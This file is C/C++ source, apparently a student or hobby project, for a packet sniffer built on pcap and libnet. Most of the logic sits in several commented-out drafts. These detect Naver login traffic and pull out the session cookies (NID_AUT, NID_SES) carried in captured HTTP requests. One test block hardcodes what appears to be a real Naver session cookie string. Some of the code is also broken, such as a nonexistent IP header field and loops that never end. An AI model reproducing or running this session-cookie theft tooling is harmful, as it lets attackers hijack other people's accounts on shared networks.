#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <libnet.h>
#include <netinet/ether.h>
#include <libgen.h>
#include <stdio.h>
#include <stdlib.h>
#include <sqlite3.h>
#include "cookie.hpp"


int main(int argc, char *argv[])
{
    Select_dev();
    delete_cookie_fuc();
    Call_Device(&dev);
    Pcap_init(&dev,&handle);
    pcap_loop(handle,-1, p_packet, NULL);


}




/*#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <libnet.h>
#include <netinet/ether.h>
#include <libgen.h>
#include <map>
#include <stdio.h>
#include <stdlib.h>
#include <regex.h>
#include "cookie.hpp"


using namespace std;

void p_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

int main(int argc, char *argv[])
{
    Call_Device(&dev);
    Pcap_init(&dev,&handle);
    pcap_loop(handle,-1, p_packet, NULL);

}


void p_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *p)
{
    map<char*,char*> m;

    libnet_ethernet_hdr * p_ether = (libnet_ethernet_hdr *)p;

    if(ntohs(p_ether->ether_type)==ETHERTYPE_IP)
    {
        if (regcomp(&reg, pattern, REG_ICASE))
        {
            printf("정규식이 컴파일 되지 않았습니다.\n");
            exit(1);
        }

        libnet_ipv4_hdr * p_ip = (libnet_ipv4_hdr *)(p+sizeof(libnet_ethernet_hdr));

        if(p_ip->ip_p == IPPROTO_TCP)
        {
            libnet_tcp_hdr * p_tcp = (libnet_tcp_hdr *)(p+sizeof(libnet_ethernet_hdr)+((p_ip->ip_hl)*4));
            int tcp_header_after_cookie_len = p_tcp->th_off * 4;
            int tcp_data_after_cookie_len = ntohs(p_ip->ip_after_cookie_len)-sizeof(libnet_ipv4_hdr) - tcp_header_after_cookie_len;

            char *tcp_data = (char *)(p_tcp)+tcp_header_after_cookie_len; // tcp_data = HTTP

            char *login_packet = strstr(tcp_data,"GET /loginv3/js/keys_js.nhn HTTP/1.1");

            if(login_packet!=NULL) flag=1;

            if(flag==1) // 로그인 패킷이 잡혔을때
            {
                char * login_cookie_packet = strstr(tcp_data,"GET /include/newsstand/press_info.json HTTP/1.1");

                if(login_cookie_packet!=NULL)
                {
                    char *cookie=strstr(login_cookie_packet,"Cookie: ");
                    //char *naver_login_cookie_packet=strtok(cookie+strlen("Cookie: "),";");
                    cookie+=strlen("Cookie: ");

                    while(cookie!=NULL)
                    {
                        if (regcomp(&reg, pattern, REG_ICASE))
                        {
                            printf("정규식이 컴파일 되지 않았습니다.\n");
                            exit(1);
                        }

                        // pattern matching

                        while(regexec(&reg, cookie+offset,1, &pmatch, REG_ICASE)==0)
                        {
                            if(cnt==21) break;
                            after_cookie_len = pmatch.rm_eo - pmatch.rm_so;//문자열의 길이
                            //printf("문자열의 길이 %d\n",after_cookie_len);
                            printf("%d:%.*s\n\n",cnt,after_cookie_len,cookie+offset+pmatch.rm_so);
                            offset = offset+pmatch.rm_eo;
                            cnt++;
                        }

                        regfree(&reg);
                    }
                   flag=0;
                }
            }



        }
    }


}

*/


/*
 * #include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <libnet.h>
#include <netinet/ether.h>
#include <libgen.h>
#include <map>
#include <stdio.h>
#include <stdlib.h>
#include <regex.h>
#include "cookie.hpp"


using namespace std;

void p_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

int main(int argc, char *argv[])
{
    Call_Device(&dev);
    Pcap_init(&dev,&handle);
    pcap_loop(handle,-1, p_packet, NULL);

}

void p_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *p)
{
    map<char*,char*> m;

    libnet_ethernet_hdr * p_ether = (libnet_ethernet_hdr *)p;

    if(ntohs(p_ether->ether_type)==ETHERTYPE_IP)
    {
        libnet_ipv4_hdr * p_ip = (libnet_ipv4_hdr *)(p+sizeof(libnet_ethernet_hdr));

        if(p_ip->ip_p == IPPROTO_TCP)
        {
            libnet_tcp_hdr * p_tcp = (libnet_tcp_hdr *)(p+sizeof(libnet_ethernet_hdr)+((p_ip->ip_hl)*4));
            int tcp_header_after_cookie_len = p_tcp->th_off * 4;
            int tcp_data_after_cookie_len = ntohs(p_ip->ip_after_cookie_len)-sizeof(libnet_ipv4_hdr) - tcp_header_after_cookie_len;

            char *tcp_data = (char *)(p_tcp)+tcp_header_after_cookie_len; // tcp_data = HTTP

            char *login_packet = strstr(tcp_data,"GET /loginv3/js/keys_js.nhn HTTP/1.1");

            if(login_packet!=NULL) flag=1;

            if(flag==1) // 로그인 패킷이 잡혔을때
            {
                char * login_cookie_packet = strstr(tcp_data,"GET /include/newsstand/press_info.json HTTP/1.1");

                if(login_cookie_packet!=NULL)
                {
                    char *cookie=strstr(login_cookie_packet,"Cookie: ");
                    char *naver_login_cookie_packet=strtok(cookie+strlen("Cookie: "),";");

                    while(naver_login_cookie_packet!=NULL )
                    {
                        printf("%s\n",naver_login_cookie_packet);
                        naver_login_cookie_packet=strtok(NULL,"; ");
                    }
                   flag=0;
                }
            }
        }
    }
}

*/

/* 정규식 출력 예제
 *
 * #include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <libnet.h>
#include <netinet/ether.h>
#include <libgen.h>
#include <map>
#include <stdio.h>
#include <stdlib.h>
#include <regex.h>
#include "cookie.hpp"


using namespace std;

void p_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);


void match_print(const char *buf, int start, int end)
{
    int i;

    for( i=0;i<end;i++ )
    {
        if( i >= start )
            printf("%c", buf[i]);
    }
    printf("\n");

}


int main(int argc, char *argv[])
{
    Call_Device(&dev);
    Pcap_init(&dev,&handle);
    pcap_loop(handle,-1, p_packet, NULL);

}

void p_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *p)
{
    map<char*,char*> m;

    libnet_ethernet_hdr * p_ether = (libnet_ethernet_hdr *)p;

    if(ntohs(p_ether->ether_type)==ETHERTYPE_IP)
    {
        if (regcomp(&reg, pattern, REG_ICASE))
        {
            printf("정규식이 컴파일 되지 않았습니다.\n");
            exit(1);
        }

        libnet_ipv4_hdr * p_ip = (libnet_ipv4_hdr *)(p+sizeof(libnet_ethernet_hdr));

        if(p_ip->ip_p == IPPROTO_TCP)
        {
            libnet_tcp_hdr * p_tcp = (libnet_tcp_hdr *)(p+sizeof(libnet_ethernet_hdr)+((p_ip->ip_hl)*4));
            int tcp_header_after_cookie_len = p_tcp->th_off * 4;
            int tcp_data_after_cookie_len = ntohs(p_ip->ip_after_cookie_len)-sizeof(libnet_ipv4_hdr) - tcp_header_after_cookie_len;

            char *tcp_data = (char *)(p_tcp)+tcp_header_after_cookie_len; // tcp_data = HTTP

            char *login_packet = strstr(tcp_data,"GET /loginv3/js/keys_js.nhn HTTP/1.1");

            if(login_packet!=NULL) flag=1;

            if(flag==1) // 로그인 패킷이 잡혔을때
            {
                char * login_cookie_packet = strstr(tcp_data,"GET /include/newsstand/press_info.json HTTP/1.1");

                if(login_cookie_packet!=NULL)
                {
                    char *cookie=strstr(login_cookie_packet,"Cookie: ");
                    //char *naver_login_cookie_packet=strtok(cookie+strlen("Cookie: "),";");
                    cookie+=strlen("Cookie: ");

                    while(cookie!=NULL)
                    {
                        if( (compiled = (regex_t*)malloc(sizeof(regex_t))) == NULL ) {
                                printf("regex_t malloc error\n" );
                                exit(-1);
                        }

                        if( regcomp( compiled, pattern, REG_EXTENDED | REG_ICASE ) != 0 ) {
                                printf("regcomp error\n" );
                                exit(-1);
                        }

                        nmatch = compiled->re_nsub+1;

                        if( (matchafter_cookie = (regmatch_t*)malloc(sizeof(regmatch_t)*nmatch)) == NULL ) {
                                printf("regmatch_t malloc error\n" );
                                exit(-1);
                        }

                        while( (result = regexec( compiled, cookie+start, nmatch, matchafter_cookie, 0)) == 0 )
                        {
                                match_print( cookie, start+matchafter_cookie->rm_so, start+matchafter_cookie->rm_eo );
                                start += matchafter_cookie->rm_eo;
                        }
                          regfree( compiled );
                    }
                   flag=0;
                }
            }



        }
    }


}


*/

/*
 * #include <stdio.h>
#include <regex.h>
#include <stdlib.h>

void match_print(const char *buf, int start, int end)
{
        int i,j;
        fprintf(stderr,"|");
        for( i=0;i<end;i++ )
                if( i >= start )
                        fprintf(stderr,"%c", buf[i] );
        fprintf(stderr,"|\n");
}


int main()
{
        int i;
        int result;
        int start=0, end=0;

        char *str = "NNB=HQFSAN57X56VO; npic=BcP0dkwGG69BmnOkm86ST9I66Ne9VH+qNY7t/vdEosUB8ZcqOXiWCqg+9FJhpUrECA==;,nx_ssl=2; nid_iplevel=1; page_uid=XqoD9dpyLPKss6I60NCsssssscw-040821; nrefreshx=0; nid_inf=1288376679; NID_AUT=TNiyjrmwwqbCv0qLu3PVpeBxhKM5sbvz7WPCqzfoRPUGKTVP952NTHL43IM3cS6R; NID_SES=AAABfKmi4/e+Mu0PpuMNZJddp2GAmfrP8DC2/M9WZYIkRZc7CE7bIYx/+Ev8Y3/pm5looY78RWsZEW80ZI7lyNyWqMVSNVBN4Gg6SyieimrnsfwaJeJyvnm32vbbJotK3lhx1uvknsIcVoajwywfn97B8egrptuw0cC2EPESNXq74t5fVHIXh4UdIn1WXruNeZSyVOXN/CPEL7Iq+v6xyGCIGhLA3TpBkii6hN+EjKlyw/uEC5LNL8fn42ET73dJSv0dWzbMY3jGFr4kmMpTmdaurzgDRXvY/xgMTgKQKp2Tl8svyl3h1y7PjhTOXjeFuJw5Af7Z2kdayvi1uXiY6QNB+F4WnCTB72/OzxeLmpcjPIPe3m7vin97cGOXBlRaD0L6MaMLkgGugy4hbVsFgFO6Zf2GVvR8EwCBJw5ALOObaH6Ja3dVTy9xVNXPjEOqhJl2cr+1s/TPVbYpNJ2AIxw9cXDUr2BuU7aR/dliUjYxUkY4bEpRxEaJaVPEfTd4Fpsm+A==";
        regex_t *compiled;
        regmatch_t *matchafter_cookie;
        size_t nmatch;

        if( (compiled = (regex_t*)malloc(sizeof(regex_t))) == NULL ) {
                fprintf(stderr, "regex_t malloc error\n" );
                exit(-1);
        }

        if( regcomp( compiled, "[a-z0-9+_/-]+[^=| |;|,]", REG_EXTENDED | REG_ICASE ) != 0 ) {
                fprintf(stderr, "regcomp error\n" );
                exit(-1);
        }

        nmatch = compiled->re_nsub+1;



        if( (matchafter_cookie = (regmatch_t*)malloc(sizeof(regmatch_t)*nmatch)) == NULL ) {
                fprintf(stderr, "regmatch_t malloc error\n" );
                exit(-1);
        }

        while( (result = regexec( compiled, str+start, nmatch, matchafter_cookie, 0)) == 0 )
        {
                match_print( str, start+matchafter_cookie->rm_so, start+matchafter_cookie->rm_eo );
                start += matchafter_cookie->rm_eo;
        }

        regfree( compiled );
}

*/

/*

void p_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *p)
{
    map<char*,char*> m;

    libnet_ethernet_hdr * p_ether = (libnet_ethernet_hdr *)p;

    if(ntohs(p_ether->ether_type)==ETHERTYPE_IP)
    {
        if (regcomp(&reg, pattern, REG_ICASE))
        {
            printf("정규식이 컴파일 되지 않았습니다.\n");
            exit(1);
        }

        libnet_ipv4_hdr * p_ip = (libnet_ipv4_hdr *)(p+sizeof(libnet_ethernet_hdr));

        if(p_ip->ip_p == IPPROTO_TCP)
        {
            libnet_tcp_hdr * p_tcp = (libnet_tcp_hdr *)(p+sizeof(libnet_ethernet_hdr)+((p_ip->ip_hl)*4));
            int tcp_header_after_cookie_len = p_tcp->th_off * 4;
            int tcp_data_after_cookie_len = ntohs(p_ip->ip_after_cookie_len)-sizeof(libnet_ipv4_hdr) - tcp_header_after_cookie_len;

            char *tcp_data = (char *)(p_tcp)+tcp_header_after_cookie_len; // tcp_data = HTTP

            char *login_packet = strstr(tcp_data,"GET /loginv3/js/keys_js.nhn HTTP/1.1");

            if(login_packet!=NULL) flag=1;

            if(flag==1) // 로그인 패킷이 잡혔을때
            {
                char * login_cookie_packet = strstr(tcp_data,"GET /include/newsstand/press_info.json HTTP/1.1");

                if(login_cookie_packet!=NULL)
                {
                    char *cookie=strstr(login_cookie_packet,"Cookie: ");
                    //char *naver_login_cookie_packet=strtok(cookie+strlen("Cookie: "),";");
                    cookie+=strlen("Cookie: ");

                    while(cookie!=NULL)
                    {
                        if (regcomp(&reg, pattern, REG_ICASE))
                        {
                            printf("정규식이 컴파일 되지 않았습니다.\n");
                            exit(1);
                        }

                        // pattern matching

                        while(regexec(&reg, cookie+offset,1, &pmatch, REG_ICASE)==0)
                        {
                            if(cnt==21) break;
                            after_cookie_len = pmatch.rm_eo - pmatch.rm_so;//문자열의 길이
                            //printf("문자열의 길이 %d\n",after_cookie_len);

                            printf("%d:%.*s\n\n",cnt,after_cookie_len,cookie+offset+pmatch.rm_so);
                            offset = offset+pmatch.rm_eo;
                            cnt++;
                        }

                        regfree(&reg);
                    }
                   flag=0;
                }
            }



        }
    }


}



*/
/*if(login_cookie_packet!=NULL)
{
    char *cookie=strstr(login_cookie_packet,"Cookie: ");
    char *naver_login_cookie_packet=strtok(cookie+strlen("Cookie: "),";");

    while(naver_login_cookie_packet!=NULL)
    {
        printf("%s\n",naver_login_cookie_packet);
        naver_login_cookie_packet=strtok(NULL,"; ");
    }
    flag=0;
    //pcap_breakloop(handle);
}*/


